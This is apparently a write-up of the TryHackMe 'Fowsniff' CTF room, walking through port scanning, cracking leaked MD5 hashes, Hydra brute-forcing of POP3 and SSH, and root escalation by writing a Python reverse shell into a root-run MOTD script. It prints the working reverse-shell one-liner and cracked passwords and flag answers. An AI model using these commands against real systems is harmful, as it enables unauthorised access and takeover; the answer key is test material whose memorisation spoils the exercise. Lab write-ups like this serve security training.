<p align="center">
  THM : Fowsniff CTF<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/ctf<br>
  <img src="https://i.imgur.com/qMHm9Kn.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Web enumeration](#web-enumeration)
- [Hash cracking](#hash-cracking)
- [POP3 enumeration](#pop3-enumeration)
- [SSH username bruteforce](#ssh-username-bruteforce)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

First, let's enumerate open ports and running services on the target :  
```
attacker@AttackBox:~/Fowsniff_CTF$ nmap 10.10.255.254 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-13 19:09 CET
Nmap scan report for 10.10.255.254
Host is up (0.046s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: UIDL CAPA PIPELINING USER TOP AUTH-RESP-CODE SASL(PLAIN) RESP-CODES
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: ENABLE LITERAL+ IMAP4rev1 AUTH=PLAINA0001 OK IDLE more LOGIN-REFERRALS Pre-login post-login have listed capabilities SASL-IR ID
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.04 seconds
```

## Web enumeration

Let's take a look at port 80 using a web browser (I use Mozilla Firefox) :  
![](https://i.imgur.com/qYdfC5H.jpg)  

So let's take a look at their Twitter account, we should be able to get sensitive information leaked by the attacker :  
![](https://i.imgur.com/6in5bBC.jpg)  

There is a link to a pastebin containing dumped credentials... Let's take a look at it :  
![](https://i.imgur.com/HN6yMB4.jpg)  

The pastebin was removed... Maybe we can find it in the [Wayback Machine](https://archive.org/web) :  
![](https://i.imgur.com/ZyykCKf.jpg)  

## Hash cracking

We have found the set of credentials leaked by the attacker ! Now, let's crack all those hashes :  
```
attacker@AttackBox:~/Fowsniff_CTF$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE4.1 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
scoobydoo2       (seina@fowsniff)     
orlando12        (parede@fowsniff)     
apples01         (tegel@fowsniff)     
skyler22         (baksteen@fowsniff)     
mailcall         (mauer@fowsniff)     
07011972         (sciana@fowsniff)     
carp4ever        (mursten@fowsniff)     
bilbo101         (mustikka@fowsniff)     
8g 0:00:00:01 DONE (2023-01-13 19:43) 5.714g/s 10245Kp/s 10245Kc/s 26201KC/s  filimani..clarus
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

## POP3 enumeration

We successfully cracked all the hashes ! Now, let's use them with [Hydra](https://github.com/vanhauser-thc/thc-hydra) to find out if anyone forgot to 
change their password on pop3 (I just removed `@fowsniff` from the usernames) :  
```
attacker@AttackBox:~/Fowsniff_CTF$ hydra -C credentials.txt 10.10.255.254 pop3
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-13 19:49:30
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries, ~1 try per task
[DATA] attacking pop3://10.10.255.254:110/
[110][pop3] host: 10.10.255.254   login: seina   password: scoobydoo2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-13 19:49:33
```

User `seina` forgot to change his/her password ! Let's login as `seina` on pop3 using `telnet` and see if there is interesting emails :  
```
attacker@AttackBox:~/Fowsniff_CTF$ telnet 10.10.255.254 110
Trying 10.10.255.254...
Connected to 10.10.255.254.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

**Question : What was seina's password to the email service ?**  
**Answer : scoobydoo2**  

**Question : Looking through her emails, what was a temporary password set for her ?**  
**Answer : S1ck3nBluff+secureshell**  

## SSH username bruteforce

We have a default SSH password. Maybe someone made the same error as seina but for SSH this time... Let's use this password and find out if any user forgot to change 
it. We can use [Hydra](https://github.com/vanhauser-thc/thc-hydra) again for this. I just made a wordlist containing only usernames :  
```
attacker@AttackBox:~/Fowsniff_CTF$ cat credentials_ssh.txt 
mauer
mustikka
tegel
baksteen
seina
mursten
parede
sciana
stone
attacker@AttackBox:~/Fowsniff_CTF$ hydra -L credentials_ssh.txt -p 'S1ck3nBluff+secureshell' 10.10.255.254 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-13 19:55:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
[DATA] attacking ssh://10.10.255.254:22/
[22][ssh] host: 10.10.255.254   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-13 19:55:16
```

Now, we have a set of ssh credentials. Let's use it to login on ssh :  
```
attacker@AttackBox:~/Fowsniff_CTF$ ssh baksteen@10.10.255.254
The authenticity of host '10.10.255.254 (10.10.255.254)' can't be established.
ECDSA key fingerprint is SHA256:5i4lzzyTeroRL7skmPatRi24vG1+59KMgqHGLyxre9Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.255.254' (ECDSA) to the list of known hosts.
baksteen@10.10.255.254's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$
```

Now we are logged in on SSH !

## Privilege escalation

It's time to get root ! Let's see what groups we are member of :  
```
baksteen@fowsniff:~$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```

We are member of group `users`... Let's find out if there is a file executable by this group :  
```
baksteen@fowsniff:~$ find / -group users -type f -executable 2>/dev/null
/opt/cube/cube.sh
```

There is a bash script located in `/opt/cube`. Let's take a look at it :  
```
baksteen@fowsniff:~$ cat /opt/cube/cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

This file seems to be executed when we log in on SSH. Let's find out if this file is run by something somewhere on the machine :  
```
baksteen@fowsniff:~$ cd /etc
baksteen@fowsniff:/etc$ grep -iRl /opt/cube/cube.sh 2>/dev/null
update-motd.d/00-header
baksteen@fowsniff:/etc$ ls -la update-motd.d/00-header 
-rwxr-xr-x 1 root root 1248 Mar 11  2018 update-motd.d/00-header
baksteen@fowsniff:/etc$ cat update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#	# Fall back to using the very slow lsb_release utility
#	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
baksteen@fowsniff:/etc$
```

The script `cube.sh` is run by root. If we have write permission on it, we can get a reverse shell as root. Let's see if we have write permissions on it :  
```
baksteen@fowsniff:/etc$ ls -la /opt/cube/cube.sh 
-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
```

Since we are member of `users` group, we have write permissions on this file. Let's put a reverse shell in it :  
```
baksteen@fowsniff:/etc$ nano cube
baksteen@fowsniff:/etc$ echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.14.32.60\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > /opt/cube/cube.sh
baksteen@fowsniff:/etc$
```

Let's run a netcat listener on port 1234 :  
```
attacker@AttackBox:~/Fowsniff_CTF$ nc -lnvp 1234
listening on [any] 1234 ...
```

Now, we can log out and log in again on SSH to make our reverse shell executed by root :  
```
attacker@AttackBox:~/Fowsniff_CTF$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.255.254] 48904
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
```

And we have a reverse shell as root ! Let's get the root flag :  
```
# cd /root   
# ls -la
total 28
drwx------  4 root root 4096 Mar  9  2018 .
drwxr-xr-x 22 root root 4096 Mar  9  2018 ..
-rw-r--r--  1 root root 3117 Mar  9  2018 .bashrc
drwxr-xr-x  2 root root 4096 Mar  9  2018 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  5 root root 4096 Mar  9  2018 Maildir
-rw-r--r--  1 root root  582 Mar  9  2018 flag.txt
# cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```

## Conclusion

This room was very cool ! It's beginner friendly, this room is very varied. Thanks for this room and thanks for reading my write ups !
